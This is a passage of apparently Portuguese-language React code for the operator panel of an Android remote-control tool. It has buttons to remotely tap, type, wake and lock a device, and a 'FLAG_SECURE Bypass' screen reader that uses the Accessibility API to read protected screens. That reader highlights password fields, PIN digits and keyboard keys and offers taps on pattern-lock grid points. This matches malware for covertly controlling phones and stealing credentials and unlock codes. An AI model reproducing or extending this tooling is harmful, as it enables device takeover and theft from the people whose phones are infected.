          ['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE'],
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* ── Manual inject ── */}
      <div className="section-title">Toque Manual</div>
      <div className="card card-sm mb10">
        <div className="txt-xs txt-dim mb6">Coordenadas brutas (device px)</div>
        <div className="input-row mb8">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 72 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 72 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
        </div>
        <div className="input-row">
          <input className="input" placeholder="Injetar texto..."
            value={typeText} onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
        </div>
      </div>

      {/* ════════════════════════════════════════════
          V2 — FLAG_SECURE Bypass Screen Reader
      ════════════════════════════════════════════ */}
      {showReader && (
        <div>
          <div className="section-title mt4">
            <span style={{ color: '#00c864' }}>🔓</span> Screen Reader V2 — FLAG_SECURE Bypass
          </div>

          <div className="row gap6 mb8" style={{ flexWrap: 'wrap' }}>
            <button className="btn btn-gold btn-sm"
              onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('Aguardando...', '#f59e0b'); }}>
              🌳 HIERARCHY
            </button>
            <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
              onClick={() => setLiveMode(v => !v)}>
              {liveMode ? '⏹ LIVE OFF' : '🔴 LIVE ON'}
            </button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>👁 SR ON</button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>⏹ SR OFF</button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => { setNodes([]); setLines([]); setRawData(''); }}>🗑</button>
          </div>

          <div className="row gap6 mb8">
            {[['ocr','📄 OCR'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, lbl]) => (
              <button key={id} onClick={() => setSrTab(id)}
                className={`btn btn-sm ${srTab === id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
            ))}
            {srTs && (
              <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
                {new Date(srTs).toLocaleTimeString()}
              </span>
            )}
          </div>

          {nodes.length > 0 && (
            <div className="row gap5 mb8">
              <span className="pill pill-green"  style={{ fontSize: 10 }}>{nodes.filter(n=>n.text).length} textos</span>
              <span className="pill pill-gold"   style={{ fontSize: 10 }}>{nodes.filter(n=>n.clickable).length} clicáveis</span>
              <span className="pill pill-purple" style={{ fontSize: 10 }}>{nodes.filter(n=>n.isKeyboard).length} kbd</span>
              <span className="pill pill-dim"    style={{ fontSize: 10 }}>{lines.length} linhas</span>
            </div>
          )}

          {/* OCR */}
          {srTab === 'ocr' && (
            <div ref={ocrRef} style={{ maxHeight: 440, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
              {lines.length === 0 && (
                <div className="no-data" style={{ padding: 44 }}>
                  <div style={{ fontSize: 36, marginBottom: 10 }}>🌳</div>
                  <div style={{ fontSize: 13 }}>Toque HIERARCHY para ler a tela</div>
                  <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 4 }}>
                    Bypass FLAG_SECURE via Accessibility API
                  </div>
                </div>
              )}
              {lines.map((row, ri) => (
                <div key={ri} style={{
                  display: 'flex', gap: 4, flexWrap: 'wrap',
                  padding: '3px 8px', borderRadius: 6,
                  background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
                }}>
                  {row.map((nd, ni) => (
                    <button key={ni} onClick={() => tapNode(nd)}
                      style={{
                        background: nd.isPinDigit
                          ? 'rgba(59,130,246,.18)' : nd.password
                          ? 'rgba(244,63,94,.12)'  : nd.isKeyboard
                          ? 'rgba(168,85,247,.12)' : nd.clickable
                          ? 'rgba(245,158,11,.12)' : 'rgba(255,255,255,.04)',
                        border: `1px solid ${
                          nd.isPinDigit ? 'rgba(59,130,246,.5)'  :
                          nd.password   ? 'rgba(244,63,94,.4)'   :
                          nd.isKeyboard ? 'rgba(168,85,247,.4)'  :
                          nd.clickable  ? 'rgba(245,158,11,.4)'  : 'rgba(255,255,255,.08)'}`,
                        borderRadius: 6, padding: '4px 10px',
                        color: nd.isPinDigit ? '#3b82f6' : nd.password ? '#f43f5e' :
                               nd.isKeyboard ? '#a855f7' : nd.clickable ? '#f59e0b' : 'var(--text2)',
                        fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                        cursor: nd.clickable ? 'pointer' : 'default',
                        fontFamily: 'var(--font)', transition: 'background .1s',
                        opacity: nd.enabled ? 1 : 0.5,
                      }}
                      title={`[${nd.bounds?.left},${nd.bounds?.top}→${nd.bounds?.right},${nd.bounds?.bottom}]`}
                    >
                      {nd.text}
                      {nd.password && <span style={{ marginLeft: 4, fontSize: 10 }}>🔒</span>}
                      {nd.checked  && <span style={{ marginLeft: 4, color: '#00c864' }}>✓</span>}
                    </button>
                  ))}
                </div>
              ))}
            </div>
          )}

          {/* Nodes */}
          {srTab === 'nodes' && (
            <div>
              <div className="input-row mb8">
                <input className="input" placeholder="Filtrar..." value={filter}
                  onChange={e => setFilter(e.target.value)} />
                <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filteredNodes.length}/{nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 480, overflowY: 'auto' }}>
                {filteredNodes.slice(0, 250).map((nd, i) => (
                  <div key={i} className="card card-sm mb4"
                    style={{
                      borderLeft: `3px solid ${nodeColor(nd)}`,
                      paddingLeft: 10 + nd.depth * 5,
                      cursor: nd.clickable ? 'pointer' : 'default',
                      opacity: nd.enabled ? 1 : 0.5,
                    }}
                    onClick={() => nd.clickable && tapNode(nd)}
                  >
                    <div className="row-sb">
                      <div style={{ flex: 1, minWidth: 0 }}>
                        {nd.text && (
                          <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--text)', marginBottom: 2 }}>
                            {nd.text}
                          </div>
                        )}
                        <div className="txt-xs txt-mono txt-dim"
                          style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {nd.cls.split('.').pop()}
                          {nd.id && <span style={{ marginLeft: 6, color: 'var(--text3)' }}>#{nd.id.split('/').pop()}</span>}
                        </div>
                      </div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 2, alignItems: 'flex-end', flexShrink: 0 }}>
                        {nd.clickable    && <span className="pill pill-gold"   style={{ fontSize: 9, padding: '1px 5px' }}>TAP</span>}
                        {nd.scrollable   && <span className="pill pill-green"  style={{ fontSize: 9, padding: '1px 5px' }}>SCROLL</span>}
                        {nd.editable     && <span className="pill pill-blue"   style={{ fontSize: 9, padding: '1px 5px' }}>EDIT</span>}
                        {nd.isPinDigit   && <span className="pill pill-blue"   style={{ fontSize: 9, padding: '1px 5px' }}>PIN</span>}
                        {nd.isKeyboard   && <span className="pill pill-purple" style={{ fontSize: 9, padding: '1px 5px' }}>⌨</span>}
                        {nd.isPatternLock && <span className="pill pill-blue"  style={{ fontSize: 9, padding: '1px 5px' }}>⊞</span>}
                        {nd.password     && <span className="pill pill-red"    style={{ fontSize: 9, padding: '1px 5px' }}>🔒</span>}
                        {nd.checked      && <span className="pill pill-green"  style={{ fontSize: 9, padding: '1px 5px' }}>✓</span>}
                        {nd.focused      && <span className="pill pill-blue"   style={{ fontSize: 9, padding: '1px 5px' }}>⊙</span>}
                      </div>
                    </div>
                    {nd.bounds && (
                      <div className="txt-xs txt-mono txt-dim mt4" style={{ fontSize: 10 }}>
                        [{nd.bounds.left},{nd.bounds.top}→{nd.bounds.right},{nd.bounds.bottom}]
                        {' '}({nd.bounds.right - nd.bounds.left}×{nd.bounds.bottom - nd.bounds.top})
                      </div>
                    )}
                    {nd.isPatternLock && nd.patternGrid && (
                      <div style={{ display: 'flex', gap: 4, marginTop: 6 }}>
                        {nd.patternGrid.map((p, pi) => (
                          <button key={pi} className="btn btn-ghost btn-xs"
                            style={{ minWidth: 26, fontSize: 11, fontWeight: 700 }}
                            onClick={ev => { ev.stopPropagation(); sendCmd('TAP', { x: p.x, y: p.y }); }}>
                            {pi + 1}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Raw */}
          {srTab === 'raw' && (
            <div>
              <div className="row-sb mb6">
                <span className="txt-xs txt-dim">{rawData.length} chars · {nodes.length} nós</span>
                <button className="btn btn-ghost btn-xs"
                  onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
                  📋 COPIAR
                </button>
              </div>
              <div className="term"
                style={{ height: 440, overflowY: 'auto', whiteSpace: 'pre', fontSize: 10, lineHeight: 1.5 }}>
                {rawData || 'Nenhum dado — toque HIERARCHY.'}
              </div>
            </div>
          )}
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
